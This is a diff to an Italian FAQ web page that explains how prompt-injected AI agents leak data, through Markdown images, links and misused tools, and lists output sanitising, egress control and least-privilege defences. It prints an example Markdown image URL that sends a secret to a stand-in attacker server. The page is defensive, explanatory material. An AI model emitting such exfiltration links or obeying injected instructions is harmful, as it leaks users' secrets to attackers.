@@ -42,6 +42,12 @@
   .answer code { cursor: pointer; }
   .answer code:hover { outline: 1px solid var(--border); }
   .answer code.copied { outline: 1px solid var(--accent); color: var(--accent); }
+  .verified { display: flex; align-items: center; gap: 7px; margin-top: 18px; font-size: 13px; color: var(--text-dim); }
+  .verified .vchk { flex: 0 0 auto; }
+  @media (prefers-reduced-motion: no-preference) {
+    .vchk path { stroke-dasharray: 24; stroke-dashoffset: 24; animation: vchk-draw .5s .15s ease forwards; }
+  }
+  @keyframes vchk-draw { to { stroke-dashoffset: 0; } }
 </style>
 </head>
 <body>
@@ -55,6 +61,7 @@
   <nav class="crumbs"><a href="../../">FabGPT-FAQ</a> › <a href="../../q/">Tutte le domande</a> › AI e LLM</nav>
   <h1>Come esfiltrano dati gli attacchi agli agenti AI (side-channel, Markdown)?</h1>
   <div class="answer"><p>Un agente compromesso via <a href="../direct-e-indirect-prompt-injection/">indirect prompt injection</a> deve poi <em>far uscire</em> i dati che ruba – e le vie sono più subdole di una connessione di rete evidente. I canali laterali documentati:</p><ul><li><strong>rendering Markdown / immagini</strong>: l&#x27;attaccante induce l&#x27;agente a generare un&#x27;immagine Markdown <code>![](https://server-attaccante.com/leak?dati=SEGRETO)</code> – quando l&#x27;interfaccia <strong>renderizza</strong> l&#x27;immagine, il browser della vittima fa la richiesta a quell&#x27;URL, <strong>esfiltrando i dati nella query string</strong>. La vittima vede solo un&#x27;immagine rotta; l&#x27;attaccante ha ricevuto il segreto. È uno degli attacchi più eleganti e ha colpito assistenti reali</li><li><strong>link cliccabili</strong> con dati codificati nell&#x27;URL, che l&#x27;utente clicca inconsapevolmente</li><li><strong>chiamate a tool</strong> legittimi piegate all&#x27;esfiltrazione (un tool che &quot;cerca sul web&quot; usato per spedire dati nella query)</li></ul><p>Le difese, a livello di prodotto e di architettura:</p><ul><li><strong>sanitizzare l&#x27;output</strong>: non renderizzare immagini/link verso domini arbitrari, allowlist dei domini, disabilitare il caricamento automatico di risorse esterne nelle risposte</li><li><strong>egress control</strong> sui tool dell&#x27;agente (<a href="../secure-web-gateway-self-hosted/">niente chiamate verso domini non fidati</a>)</li><li><strong><a href="../come-si-limita-un-agente-ai/">permessi minimi</a></strong>: l&#x27;agente non deve avere accesso <em>sia</em> ai dati sensibili <em>sia</em> alla capacità di comunicare con l&#x27;esterno senza controlli</li></ul><p>È un promemoria che la sicurezza degli agenti non finisce al prompt: <a href="../sicurezza-del-rag-e-dei-vector-database/">ciò che l&#x27;agente legge</a> può ordinargli di agire, e <a href="../firewall-semantici-e-guardrail-runtime/">come il suo output viene renderizzato</a> può essere il canale di fuga. Superficie nuova, principi vecchi: valida gli input, controlla gli output, minimizza i privilegi.</p></div>
+  <div class="verified"><svg class="vchk" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="var(--accent)" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6L9 17l-5-5"/></svg><span>Verificata a mano · zero allucinazioni</span></div>
   <a class="ask" href="../../?q=agent-exfiltration">Chiedilo a FabGPT-FAQ →</a>
   <div class="related">
     <h2>Altre domande</h2>
